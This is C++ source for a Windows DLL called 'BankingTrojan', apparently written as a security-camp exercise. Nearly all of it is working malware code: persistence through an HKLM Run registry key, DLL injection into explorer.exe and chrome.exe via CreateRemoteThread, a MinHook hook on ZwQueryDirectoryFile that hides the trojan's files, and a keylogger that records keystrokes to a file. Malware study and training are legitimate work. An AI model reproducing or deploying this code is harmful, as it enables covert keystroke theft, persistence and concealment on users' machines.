/*
	BankingTrojan
	Author:Dinlon5566
	Email:  admin@dinlon5566.com
	Environment: VS19
	This project is for "TeamT5 Security Camp 2025 實作題目" only.
*/

#include "pch.h"
#include "Windows.h"
#include <iostream>

#include <tlhelp32.h>
#include <psapi.h>    // GetModuleBaseNameW function
#include <processthreadsapi.h>


// For Keylogger
#include <wchar.h>
#include <fstream>
#include <string>
#include <map>
#include <mutex>

// For MinHook
#include "types.h"
#include "include/MinHook.h"
#if defined _M_X64
#pragma comment(lib, "libMinHook.x64.lib")
#elif defined _M_IX86
#pragma comment(lib, "libMinHook.x86.lib")
#endif

// Debug Message Box Print
#define DEBUG 1

const wchar_t dllName[] = L"BankingTrojan.dll";
const wchar_t targetProcessName[] = L"chrome.exe";
const std::string string_dllName = "BankingTrojan.dll";

// Function declaration
bool getDLLPath(wchar_t*);
DWORD WINAPI ExplorerMainThread(LPVOID);

/*
	Logger
*/


class Logger {
public:
	static Logger& getInstance() {
		static Logger instance;
		return instance;
	}

	bool initialize(const wchar_t* dllPath) {
		std::wstring path(dllPath);
		size_t pos = path.find_last_of(L"\\/");
		if (pos == std::wstring::npos) {
			return false; 
		}
		directory = path.substr(0, pos + 1);
		//MessageBoxW(NULL, directory.c_str(), L"initializeLogger", MB_OK);
		return true;
	}


	bool setLogFile(const std::wstring& logName) {
		std::lock_guard<std::mutex> lock(mtx);

		if (logFiles.find(logName) == logFiles.end()) {
			std::wstring fullPath = directory + logName;
			std::wofstream* ofs = new std::wofstream(fullPath, std::ios::app);
			if (!ofs->is_open()) {
				// open stream fail
				delete ofs;
				return false; 
			}
			logFiles[logName] = ofs;
		}
		return true;
	}


	void log(const std::wstring& logName, const std::wstring& message) {
		std::lock_guard<std::mutex> lock(mtx);
		auto it = logFiles.find(logName);
		if (it != logFiles.end()) {
			// flush without std::endl
			*(it->second) << message ;
			it->second->flush();
		}
	}

	void closeAll() {
		std::lock_guard<std::mutex> lock(mtx);
		for (auto& pair : logFiles) {
			if (pair.second->is_open()) {
				pair.second->close();
			}
			delete pair.second;
		}
		logFiles.clear();
	}

private:
	Logger() {}
	~Logger() { closeAll(); }

	Logger(const Logger&) = delete;
	Logger& operator=(const Logger&) = delete;

	std::wstring directory; // file directory
	std::map<std::wstring, std::wofstream*> logFiles;
	std::mutex mtx;
};

void initializeLogger() {
	wchar_t dllPath[MAX_PATH];
	if (getDLLPath(dllPath)) {
		if (!Logger::getInstance().initialize(dllPath)) {
			if(DEBUG)
				MessageBoxW(NULL, L"Fail to initialize Logger", L"initializeLogger", MB_OK);
		}
	}
	else {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to get DLL path", L"initializeLogger", MB_OK);
	}
}

void logKeylogger(const std::wstring& message) {
	Logger::getInstance().setLogFile(L"gKeylogger.log");
	Logger::getInstance().log(L"gKeylogger.log", message);
}

void logBankingTrojanKeylogger(const std::wstring& message) {
	Logger::getInstance().setLogFile(L"BankingTrojanKeylogger.txt");
	Logger::getInstance().log(L"BankingTrojanKeylogger.txt", message);
}


/*
	Common functions
*/

// Check if the current user is an administrator
bool isUserAdmin() {	// from MDMZ_Book.pdf
	bool isElevated = false;
	HANDLE token;
	TOKEN_ELEVATION elev;
	DWORD size;
	if (OpenProcessToken(GetCurrentProcess(),
		TOKEN_QUERY, &token)) {
		if (GetTokenInformation(token, TokenElevation,
			&elev, sizeof(elev), &size)) {
			isElevated = elev.TokenIsElevated;
		}
	}
	if (token) {
		CloseHandle(token);
		token = NULL;
	}
	return isElevated;
}


bool getDLLPath(wchar_t* DLLPath) {
	HMODULE hModule = NULL;
	if (GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCTSTR)&getDLLPath, &hModule))
	{
		if (GetModuleFileName(hModule, DLLPath, MAX_PATH) > 0)
		{
			return true;
		}
	}
	return false;
}


// Do noting
void debug_hold() {
	while (true) {
		Sleep(1000);
	}
}


/*
	System functions
*/

bool writeRegedit(const wchar_t* dllPath) {
	// start command:
	// rundll32 "C:\dev\BankingTrojan\x64\Debug\BankingTrojan.dll", StartBankingTrojan
	// rundll32 BankingTrojan.dll, StartBankingTrojan
	const wchar_t* valueName = L"BankingTrojan";
	const wchar_t* regPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	//const wchar_t* regValue = L"C:\\Windows\\System32\\rundll32.exe \"C:\\dev\\BankingTrojan\\x64\\Debug\\BankingTrojan.dll\", StartBankingTrojan";
	std::wstring regLValue = L"C:\\Windows\\System32\\rundll32.exe \"" + std::wstring(dllPath) + L"\", StartBankingTrojan";
	const wchar_t* regValue = regLValue.c_str();


	HKEY hKey;
	LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, KEY_SET_VALUE, &hKey);
	if (result != ERROR_SUCCESS)
	{
		return false;
	}

	result = RegSetValueExW(hKey, valueName, 0, REG_SZ, reinterpret_cast<const BYTE*>(regValue), (wcslen(regValue) + 1) * sizeof(wchar_t));
	if (result != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return false;
	}

	RegCloseKey(hKey);
	return true;
}

bool IsProcessRunning(const wchar_t* processName, DWORD* PID = 0)
{
	bool exists = false;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32W pe;
		pe.dwSize = sizeof(PROCESSENTRY32W);

		if (Process32FirstW(hSnapshot, &pe))
		{
			do
			{
				if (_wcsicmp(pe.szExeFile, processName) == 0)
				{
					exists = true;
					*PID = pe.th32ProcessID;
					break;
				}
			} while (Process32NextW(hSnapshot, &pe));
		}
		CloseHandle(hSnapshot);
	}
	return exists;
}

/*
	Loder functions
*/

bool DLLinject(DWORD pid, const wchar_t* dllPath) {
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		//CloseHandle(hProcess); //  0
		return false;
	}

	LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, (wcslen(dllPath) + 1) * sizeof(wchar_t), MEM_COMMIT, PAGE_READWRITE);
	if (pDllPath == NULL)
	{
		CloseHandle(hProcess);
		return false;
	}

	SIZE_T bytesWritten;
	if (!WriteProcessMemory(hProcess, pDllPath, dllPath, (wcslen(dllPath) + 1) * sizeof(wchar_t), &bytesWritten))
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	HMODULE hKernel32 = GetModuleHandleW(L"Kernel32.dll");
	if (hKernel32 == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	LPTHREAD_START_ROUTINE pLoadLibraryW = reinterpret_cast<LPTHREAD_START_ROUTINE>(GetProcAddress(hKernel32, "LoadLibraryW"));
	if (pLoadLibraryW == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, pDllPath, 0, NULL);
	if (hThread == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	WaitForSingleObject(hThread, INFINITE);

	VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return true;
}


bool TrojanLoader(const wchar_t* dllPath) {
	// Wait for the target process to start

	// First injection to explorer.exe,then inject to chrome.exe

	// explorer.exe
	DWORD targetPID ;
	const DWORD waitInterval = 1000;
	DWORD explorerThreadId = 0;

	//explorer.exe
	// Beause debug API hook was fail, so inject to explorer.exe.
	targetPID = 0;
	const wchar_t explorerProcessName[] = L"explorer.exe";
	while (!IsProcessRunning(explorerProcessName, &targetPID))
	{
		Sleep(waitInterval);
	}
	DLLinject(targetPID, dllPath);


	// chrome.exe
	targetPID = 0;
	while (!IsProcessRunning(targetProcessName, &targetPID))
	{
		Sleep(waitInterval);
	}

	// Inject the DLL into the target process
	DLLinject(targetPID, dllPath);
	return true;
}

/*
	Explorer functions

	Debug API Hook was fail QQ
	https://github.com/Dinlon5566/IT_Reverse_Engineering/blob/main/Dx25/apiHooker.cpp

	MinHook
	https://github.com/zeze-zeze/2021iThome/blob/master/Explorer%E4%BD%A0%E6%80%8E%E9%BA%BC%E6%B2%92%E6%84%9F%E8%A6%BA/Rootkit/Rootkit/dllmain.cpp
*/

/*
* //Debug API Hook function
bool explorerStayDebugEvent() {
	DEBUG_EVENT debugEvent;
	DWORD dwStat;
	while (WaitForDebugEvent(&debugEvent, INFINITE)) {
		dwStat = DBG_CONTINUE;
		/*
		if (debugEvent.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT) {
			doCreateEvent(&debugEvent);
		}
		else if (debugEvent.dwDebugEventCode == EXCEPTION_DEBUG_EVENT)
		{
			doExceptionEvent(&debugEvent);
		}
		else if (debugEvent.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT) {
			printf("Process %d is down!\n", debugEvent.dwProcessId);
			break;
		}
		ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, dwStat);
	}


	return 1;

};
*/

int cnt = 0;
typedef NTSTATUS(WINAPI* ZWQUERYDIRECTORYFILE)(
	HANDLE                 FileHandle,
	HANDLE                 Event,
	PIO_APC_ROUTINE        ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FileInformationClassEx FileInformationClass,
	BOOLEAN                ReturnSingleEntry,
	PUNICODE_STRING        FileName,
	BOOLEAN                RestartScan
	);
ZWQUERYDIRECTORYFILE fpZwQueryDirectoryFile = NULL;



// 根據 FileInformationClass 回傳 FileInformation 的 FileName
WCHAR* GetFileDirEntryFileName(PVOID fileInformation, FileInformationClassEx fileInformationClass)
{
	switch (fileInformationClass)
	{
	case FileInformationClassEx::FileDirectoryInformation:
		return ((FileDirectoryInformationEx*)fileInformation)->FileName;
	case FileInformationClassEx::FileFullDirectoryInformation:
		return ((FileFullDirInformationEx*)fileInformation)->FileName;
	case FileInformationClassEx::FileIdFullDirectoryInformation:
		return ((FileIdFullDirInformationEx*)fileInformation)->FileName;
	case FileInformationClassEx::FileBothDirectoryInformation:
		return ((FileBothDirInformationEx*)fileInformation)->FileName;
	case FileInformationClassEx::FileIdBothDirectoryInformation:
		return ((FileIdBothDirInformationEx*)fileInformation)->FileName;
	case FileInformationClassEx::FileNamesInformation:
		return ((FileNamesInformationEx*)fileInformation)->FileName;
	default:
		return NULL;
	}
}

// 根據 FileInformationClass 回傳 FileInformation 的 NextEntryOffset
ULONG GetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileInformationClass)
{
	switch (fileInformationClass)
	{
	case FileInformationClassEx::FileDirectoryInformation:
		return ((FileDirectoryInformationEx*)fileInformation)->NextEntryOffset;
	case FileInformationClassEx::FileFullDirectoryInformation:
		return ((FileFullDirInformationEx*)fileInformation)->NextEntryOffset;
	case FileInformationClassEx::FileIdFullDirectoryInformation:
		return ((FileIdFullDirInformationEx*)fileInformation)->NextEntryOffset;
	case FileInformationClassEx::FileBothDirectoryInformation:
		return ((FileBothDirInformationEx*)fileInformation)->NextEntryOffset;
	case FileInformationClassEx::FileIdBothDirectoryInformation:
		return ((FileIdBothDirInformationEx*)fileInformation)->NextEntryOffset;
	case FileInformationClassEx::FileNamesInformation:
		return ((FileNamesInformationEx*)fileInformation)->NextEntryOffset;
	default:
		return 0;
	}
}

// 根據 FileInformationClass 設定 FileInformation 的 NextEntryOffset
void SetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileInformationClass, ULONG value)
{
	switch (fileInformationClass)
	{
	case FileInformationClassEx::FileDirectoryInformation:
		((FileDirectoryInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	case FileInformationClassEx::FileFullDirectoryInformation:
		((FileFullDirInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	case FileInformationClassEx::FileIdFullDirectoryInformation:
		((FileIdFullDirInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	case FileInformationClassEx::FileBothDirectoryInformation:
		((FileBothDirInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	case FileInformationClassEx::FileIdBothDirectoryInformation:
		((FileIdBothDirInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	case FileInformationClassEx::FileNamesInformation:
		((FileNamesInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	}
}

// 竄改原始的 ZwQueryDirectoryFile，隱藏檔名中有 "BankingTrojan" 字串的檔案
NTSTATUS DetourZwQueryDirectoryFile(
	HANDLE                 FileHandle,
	HANDLE                 Event,
	PIO_APC_ROUTINE        ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FileInformationClassEx FileInformationClass,
	BOOLEAN                ReturnSingleEntry,
	PUNICODE_STRING        FileName,
	BOOLEAN                RestartScan
) {
	// 1. 呼叫原本的 ZwQueryDirectoryFile，取得檔案結構
	NTSTATUS status = fpZwQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);

	// 2. 確認是不是目標的 FileInformationClass
	if (NT_SUCCESS(status) && (FileInformationClass == FileInformationClassEx::FileDirectoryInformation || FileInformationClass == FileInformationClassEx::FileFullDirectoryInformation || FileInformationClass == FileInformationClassEx::FileIdFullDirectoryInformation || FileInformationClass == FileInformationClassEx::FileBothDirectoryInformation || FileInformationClass == FileInformationClassEx::FileIdBothDirectoryInformation || FileInformationClass == FileInformationClassEx::FileNamesInformation)) {
		PVOID pCurrent = FileInformation;
		PVOID pPrevious = NULL;
		do {
			// 3. 透過檔名判斷是不是要隱藏的檔案
			if (std::wstring(GetFileDirEntryFileName(pCurrent, FileInformationClass)).find(L"BankingTrojan") == 0) {
				// 4. 要隱藏的檔案，就把目前的 Entry 竄改成下一個 Entry
				ULONG nextEntryOffset = GetFileNextEntryOffset(pCurrent, FileInformationClass);
				if (nextEntryOffset != 0) {
					int bytes = (DWORD)Length - ((ULONG)pCurrent - (ULONG)FileInformation) - nextEntryOffset;
					RtlCopyMemory((PVOID)pCurrent, (PVOID)((char*)pCurrent + nextEntryOffset), (DWORD)bytes);
				}
				// 如果已經是最後一個檔案了，就把上一個 Entry 的 NextEntryOffset 改成 0
				else {
					if (pCurrent == FileInformation)status = 0;
					else SetFileNextEntryOffset(pPrevious, FileInformationClass, 0);
					break;
				}
			}
			else {
				// 5. 不隱藏的檔案，就加上 NextEntryOffset 繼續判斷下一個檔案，直到 NextEntryOffset 等於 0 為止
				pPrevious = pCurrent;
				pCurrent = (BYTE*)pCurrent + GetFileNextEntryOffset(pCurrent, FileInformationClass);
			}
		} while (GetFileNextEntryOffset(pPrevious, FileInformationClass) != 0);
	}
	return status;
}


bool explorerMain( ) {
	wchar_t DLLPath[MAX_PATH];
	if (!getDLLPath(DLLPath)) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to get DLL path", L"ExplorerMain", MB_OK);
		return 0;
	}
	
	/*
	*      Debug API Hook was fail
	*
	// set debuger mode
	if (!DebugActiveProcess(targetPID)) {
		if(DEBUG)
			MessageBoxW(NULL, L"Fail to DebugActiveProcess", L"ExplorerMain", MB_OK);
		return 0;
	}
	//explorerStayDebugEvent();
	*/

	// MinHook
	/*
	if (MH_Initialize() != MH_OK) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to MH_Initialize", L"ExplorerMain", MB_OK);
		return 0;
	}
	*/
	//--------------


	// 取得 ntdll.dll 的 handle
	HINSTANCE hDLL = LoadLibrary(L"ntdll.dll");
	if (!hDLL) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to LoadLibrary", L"ExplorerMain", MB_OK);
		return 1;
	}

	// 從 ntdll.dll 找到 ZeQueryDirectoryFile
	void* ZwQueryDirectoryFile = (void*)GetProcAddress(hDLL, "ZwQueryDirectoryFile");
	// show addr
	if (!ZwQueryDirectoryFile) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to GetProcAddress", L"ExplorerMain", MB_OK);
		return 1;
	}

	// 用 Hook 把 ZwQueryDirectoryFile 竄改成我們定義的 DetourZwQueryDirectoryFile
	if (MH_Initialize() != MH_OK) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to MH_Initialize", L"ExplorerMain", MB_OK);
		return 1;
	}
	int status = MH_CreateHook(ZwQueryDirectoryFile, &DetourZwQueryDirectoryFile, reinterpret_cast<LPVOID*>(&fpZwQueryDirectoryFile));
	if (status != MH_OK) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to MH_CreateHook", L"ExplorerMain", MB_OK);
		return 1;
	}

	// 啟用 Hook
	status = MH_EnableHook(ZwQueryDirectoryFile);
	if (status != MH_OK) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to MH_EnableHook", L"ExplorerMain", MB_OK);
		return 1;
	}

	//--------------
	//SetFileAttributesW(DLLPath, FILE_ATTRIBUTE_HIDDEN);

	if(DEBUG) 
		MessageBoxW(NULL, L"Success run to explorer.exe to END", L"ExplorerMain", MB_OK);
	return 1;
}

DWORD WINAPI ExplorerMainThread(LPVOID lpParam)
{
	explorerMain();
	return 0;
}


/*
	Chrome functions
*/

int chromeMain() {

	if(DEBUG)
		MessageBoxW(NULL, L"Success run to Chrome", L"ChromeMainThread", MB_OK);



	debug_hold();
	return 1;
}

DWORD WINAPI ChromeMainThread(LPVOID lpParam)
{
	chromeMain();
	return 0;
}

/*
	Key logger functions
	https://github.com/shubhangi-singh21/Keylogger/
*/

int keyLoggerMain() {

	logBankingTrojanKeylogger(L"KeyLoggerStart!\n");
	char key;
	while (true) {
		Sleep(10);
		for (key = 8; key <= 255; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				switch (key)
				{
				case VK_SHIFT:
					logBankingTrojanKeylogger(L"[SHIFT]");
					break;
				case VK_BACK:
					logBankingTrojanKeylogger(L"[BACKSPACE]");
					break;
				case VK_LBUTTON:
					//logBankingTrojanKeylogger(L"[LBUTTON]");
					break;
				case VK_RBUTTON: 
					//logBankingTrojanKeylogger(L"[RBUTTON]");
					break;
				case VK_RETURN:
					logBankingTrojanKeylogger(L"[ENTER]\n");
					break;
				case VK_TAB:
					logBankingTrojanKeylogger(L"[TAB]");
					break;
				case VK_ESCAPE:
					logBankingTrojanKeylogger(L"[ESCAPE]");
					break;
				case VK_CONTROL:
					logBankingTrojanKeylogger(L"[Ctrl]");
					break;
				case VK_MENU:
					logBankingTrojanKeylogger(L"[Alt]");
					break;
				case VK_CAPITAL: 
					logBankingTrojanKeylogger(L"[CAPS Lock]");
					break;
				case VK_SPACE: 
					logBankingTrojanKeylogger(L"[SPACE]");
					break;
				}
				if (key == VK_SHIFT || key == VK_BACK || key == VK_LBUTTON || key == VK_RBUTTON || key == VK_RETURN || key == VK_TAB || key == VK_ESCAPE || key == VK_CONTROL || key == VK_MENU || key == VK_CAPITAL || key == VK_SPACE) {
					continue;
				}
				else {
					bool isShiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
					if (!isShiftPressed && key >= 'A' && key <= 'Z') {
						key = tolower(key);
					}

					logBankingTrojanKeylogger(std::wstring(1, key).c_str());
				}
			}
		}
	}
	if (DEBUG)
		MessageBoxW(NULL, L"Success run to KeyLogger to END", L"KeyLoggerMainThread", MB_OK);
	return 1;
}

DWORD WINAPI KeyLoggerMainThread(LPVOID lpParam)
{
	keyLoggerMain();
	return 0;
}

/*
	RunDLL32 Entry point
*/
extern "C" __declspec(dllexport) void CALLBACK StartBankingTrojan(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	wchar_t dllPath[MAX_PATH];

	if ( !getDLLPath(dllPath)) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to get DLL path", L"StartBankingTrojan", MB_OK);
		ExitProcess(-1);
	}

	// Register key first
	if (isUserAdmin()) {
		writeRegedit(dllPath);
	}
	else if(DEBUG){
		MessageBoxW(NULL, L"Please run as administrator\nRun without admin now ", L"BankingTrojan", MB_OK);
	}

	//keylogger thread
	DWORD KeyloggerThreadId = 0;
	HANDLE hKeyloggerThread = CreateThread(
		NULL,
		0,
		KeyLoggerMainThread,
		NULL,
		0,
		&KeyloggerThreadId
	);
	TrojanLoader(dllPath);

	// Wait for the keylogger thread to finish
	WaitForSingleObject(hKeyloggerThread, INFINITE);
	CloseHandle(hKeyloggerThread);


	ExitProcess(0);
}

/*
	DLL Entry point
		RunDLL32 => $NULL
		Chrome => ChromeMainThread
		Explorer => ExplorerMainThread
*/
BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{

	HANDLE hProcess = GetCurrentProcess();
	wchar_t processName[MAX_PATH] = L"<unknown>";
	wchar_t exploreName[] = L"explorer.exe";
	HANDLE hThread = NULL;
	DWORD threadId = 0;

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		initializeLogger();

		HANDLE hProcess = GetCurrentProcess();

		if (GetModuleBaseNameW(hProcess, NULL, processName, MAX_PATH))
		{
			if (_wcsicmp(processName, targetProcessName) == 0) {
				// New thread for chromeMain
				hThread = CreateThread(
					NULL,
					0,
					ChromeMainThread,
					NULL,
					0,
					&threadId
				);

				if (hThread == NULL) {
					// fail to create thread
				}
			}
			else if (_wcsicmp(processName, exploreName)==0) {
				// New thread for explorerMain
				hThread = CreateThread(
					NULL,
					0,
					ExplorerMainThread,
					NULL,
					0,
					&threadId
				);

				if (hThread == NULL) {
					// fail to create thread
				}
			}
			else if (_wcsicmp(processName, exploreName) == 0)
			{
				// todo
			}
		}
	}

	break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
	{
		Logger::getInstance().closeAll();

		if (hThread != NULL) {
			// Terminate thread( Wait DETACH)
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
			hThread = NULL;
		}
	}
	break;
	}
	return TRUE;
}

